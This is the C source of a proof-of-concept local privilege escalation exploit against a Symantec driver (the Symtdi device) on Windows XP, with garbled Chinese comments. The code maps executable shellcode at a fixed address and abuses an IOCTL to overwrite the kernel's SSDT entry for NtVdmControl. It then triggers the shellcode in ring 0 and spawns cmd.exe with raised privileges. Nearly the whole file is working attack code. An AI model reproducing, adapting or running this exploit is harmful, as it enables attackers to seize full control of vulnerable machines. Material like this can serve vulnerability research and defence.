#include <stdio.h>
#include <windows.h>

#pragma comment (lib, "ntdll.lib")

typedef LONG NTSTATUS;

#define STATUS_SUCCESS  ((NTSTATUS)0x00000000L) 
#define STATUS_INFO_LENGTH_MISMATCH ((NTSTATUS)0xC0000004L) 

typedef struct _IMAGE_FIXUP_ENTRY {
    WORD    offset:12;
    WORD    type:4;
} IMAGE_FIXUP_ENTRY, *PIMAGE_FIXUP_ENTRY;

typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

extern "C"
NTSTATUS 
NTAPI
NtAllocateVirtualMemory(
    IN HANDLE ProcessHandle,
    IN OUT PVOID *BaseAddress,
    IN ULONG ZeroBits,
    IN OUT PULONG AllocationSize,
    IN ULONG AllocationType,
    IN ULONG Protect
    );

int main(int argc, char* argv[])
{
    NTSTATUS    status;
    HANDLE    deviceHandle;
    DWORD    dwReturnSize = 0;
    PVOID    VdmControl = NULL;
	
	//shellcode��ر���
    PVOID    ShellCodeMemory = (PVOID)0x2E332E35;//(PVOID)0x2E352E35;//???????????2E332E35h
    DWORD    MemorySize = 0x2000;

    PROCESS_INFORMATION            pi;
    STARTUPINFOA                stStartup;

	//�жϲ���ϵͳ���� winXP sp1
    OSVERSIONINFOEX    OsVersionInfo;
    RtlZeroMemory( &OsVersionInfo, sizeof(OsVersionInfo) );
    OsVersionInfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
    GetVersionEx ((OSVERSIONINFO *) &OsVersionInfo);
    if ( OsVersionInfo.dwMajorVersion != 5 ) {

        printf( "Not NT5 system\n" );
        ExitProcess( 0 );
        return 0;
    }
    if ( OsVersionInfo.dwMinorVersion != 1 ) {
    
        printf( "isn't windows 2003 system\n" );
        ExitProcess( 0 );
        return 0;
    }

	//��ʼ©������������	
    printf( "Symantec Local Privilege Escalation Vulnerability Exploit (POC) \n\n" );
    printf( "Tested on: \n\twindows XP (ntoskrnl.exe version) \n\n" );
    printf( "\tCoded by shineast\n\n" );
	//Ϊshellcode�����ڴ�
    status = NtAllocateVirtualMemory( (HANDLE)-1, 
                                      &ShellCodeMemory,//Ϊshellcodeָ�����ڴ�����ַ0x2E352E35;
                                      0, 
                                      &MemorySize, //shellcode��С0x2000;
                                      MEM_RESERVE|MEM_COMMIT|MEM_TOP_DOWN,
                                      PAGE_EXECUTE_READWRITE );//�ɶ�д����ִ��
    //����ɹ�
	if ( status != STATUS_SUCCESS ) {    
        printf( "NtAllocateVirtualMemory failed, status: %08X\n", status );
        return 0;
    }
	//������ڴ�ռ�������0x90����nopָ��
    memset( ShellCodeMemory, 0x90, MemorySize );
	//�ٰ���ʵ��shellcodeװ������ڴ�ռ�
    __asm {
        call    CopyShellCode
        //shellcode��ʼ//////////////////////////////////////////////////////////////
		nop	
        nop
        nop
        nop
        nop
        nop
/*
��������Ըɵ㻵��
*/
		//int 3
        //
        // �ָ�SSDT��֤ϵͳ�ܹ���������
		/*���ǿ���ȥHookһ��SSDT�ϵĺ����������ǽ��е��ñ�Hook�ĺ���ʱ���л��������ǵ�ring0����
		�õ�����,Hook�ĺ���������ѡ�� NtVdmControl����Ȼ���︲����9�ֽڵ����ݣ���������NtVdmControl
		�����һ������ҲΪһ�������õ�api���������ǵ�exploit���Ա�֤%80���ϵ���Ч�ʣ�����һ��Ҫ��
		����ring 0�����ʱ�����һЩ�ֳ��ָ�����Ȼһ�������ıȽ��ѿ��ġ�
		*/
        //
        mov edi, 0x804e4150
        mov [edi], 0x805Bab48
        mov [edi+4], 0x80659dd0
        mov [edi+8], 0x805672b1
		// ntoskrnl.exe

        ret 8
		//shellcode����//////////////////////////////////////////////////////////////

		
CopyShellCode://��������ã�����shellcode
        pop    esi
        lea ecx, CopyShellCode
        sub ecx, esi

        mov edi,0x2E332E35//Ϊshellcodeָ�����ڴ�����ַ0x2E352E35;
        cld
        rep movsb//��ʼ��esi����shellcode��edi��0x2E352E35��
    }

	//ͨ���豸�������ӻ�ȡ�豸����������豸
    deviceHandle = CreateFile("\\\\.\\Symtdi",
                        0,
                        FILE_SHARE_READ|FILE_SHARE_WRITE,
                        NULL,
                        OPEN_EXISTING,
                        0,
                        NULL);
	//���ʧ��
    if ( INVALID_HANDLE_VALUE == deviceHandle ) {
        printf( "Open Symtdi device failed, code: %d\n", GetLastError() );
        return 0;
    } 
	else {    
        printf( "Open Symtdi device success\n" );
    }
	/////////////////////////////////////////////////////////////////////////////////
	//���豸�ɹ���ͨ���豸���������е�0x83022003 dwIoControlCode
    DeviceIoControl( deviceHandle, 
                     0x83022003, 
                     NULL,
                     0,
                     (PVOID)0x804e4150,//SSDT��NtVdmControl��������ַ�ĵ�ַ
                     0xC,
                     &dwReturnSize,  
                     NULL );
	////////////////////////////////////////////////////////////////////////////////
	//�ر��豸
    CloseHandle( deviceHandle );

    VdmControl = GetProcAddress( LoadLibrary("ntdll.dll"), "ZwVdmControl" );
    if ( VdmControl == NULL ) {
        printf( "VdmControl == NULL\n" );
        return 0;
    }
    printf( "call shellcode ... " );
    _asm {
        xor ecx,ecx
        push ecx  //push 0
        push ecx  //push 0
        mov eax, VdmControl
        call eax
    }
    printf( "Done.\n" );

    printf( "Create New Process\n" );
    GetStartupInfo( &stStartup );
    CreateProcess( NULL,
                    "cmd.exe",
                    NULL,
                    NULL,
                    TRUE,
                    NULL,
                    NULL,
                    NULL,
                    &stStartup,
                    &pi );
    return 0;
}